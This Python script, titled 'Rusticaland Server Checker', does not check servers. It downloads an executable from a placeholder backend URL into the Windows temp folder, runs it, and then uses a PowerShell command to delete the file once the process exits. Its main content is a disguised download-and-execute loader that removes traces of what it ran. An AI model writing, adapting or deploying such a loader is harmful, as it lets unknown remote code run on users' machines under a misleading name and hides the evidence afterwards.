import os
import sys
import time
import ctypes
import tempfile
import urllib.request
import urllib.error
import subprocess

URL = "BACKEND-HERE"

def set_title(title):
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            os.system(f"title {title}")

def set_fixed_console(cols=125, lines=40, lock=False):
    try:
        os.system(f"mode con: cols={cols} lines={lines}")
        if lock:
            h = ctypes.windll.kernel32.GetConsoleWindow()
            if h:
                user32 = ctypes.windll.user32
                GWL_STYLE = -16
                WS_MAXIMIZEBOX = 0x00010000
                WS_THICKFRAME = 0x00040000
                style = user32.GetWindowLongW(h, GWL_STYLE)
                new_style = style & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME
                user32.SetWindowLongW(h, GWL_STYLE, new_style)
                user32.SetWindowPos(h, 0, 0, 0, 0, 0, 0x0020 | 0x0001 | 0x0002 | 0x0004)
    except Exception:
        pass

def download(url):
    name = f"RusticalandLatest_{int(time.time())}.exe"
    path = os.path.join(tempfile.gettempdir(), name)
    with urllib.request.urlopen(url, timeout=15) as r:
        with open(path, "wb") as f:
            while True:
                chunk = r.read(1024 * 64)
                if not chunk:
                    break
                f.write(chunk)
    return path

def run_and_cleanup(path):
    try:
        proc = subprocess.Popen([path], close_fds=True)
    except Exception:
        return False
    try:
        ps_path = "'" + path.replace("'", "''") + "'"
        ps_cmd = f"Wait-Process -Id {proc.pid}; Start-Sleep -Milliseconds 200; Remove-Item -Force {ps_path}"
        subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_cmd])
    except Exception:
        pass
    return True

def main():
    set_title("Rusticaland Server Checker")
    set_fixed_console()
    try:
        p = download(URL)
    except urllib.error.URLError:
        print("Error - Could not download latest.exe")
        sys.exit(1)
    except Exception:
        print("Error - Download failed")
        sys.exit(1)
    ok = run_and_cleanup(p)
    if not ok:
        print("Error - Could not start downloaded file")
        try:
            os.remove(p)
        except Exception:
            pass
        sys.exit(1)
    sys.exit(0)

if __name__ == "__main__":
    main()
